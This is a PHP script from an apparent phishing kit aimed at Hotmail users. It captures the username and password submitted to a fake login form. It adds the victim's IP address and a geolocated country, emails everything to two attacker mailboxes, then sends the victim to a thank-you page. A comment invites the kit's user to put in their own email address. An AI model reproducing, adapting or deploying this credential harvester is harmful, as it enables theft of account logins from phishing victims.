<?

$ip = getenv("REMOTE_ADDR");

$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.

$ip));

$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));

$hostname = gethostbyaddr($ip);

$message .= "=======================\n";
$message .= "Username : ".$_POST['username']."\n";
$message .= "Password  : ".$_POST['password']."\n";
$message .= "IP               : ".$ip."\n";
$message .= "country     : ".$country."\n";
$message .= "=======================\n";


//change ur email here
$send = "segologs@gmail.com,segologs@yandex.com";

$subject = "NETHERLANDS HOTMAIL";
$headers = "From: OBA";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

$arr=array($send, $IP);
foreach ($arr as $send)
{
mail($send,$subject,$message,$headers);
mail($to,$subject,$message,$headers);
}

	
		   header("Location:thankyou.html");

	 
?>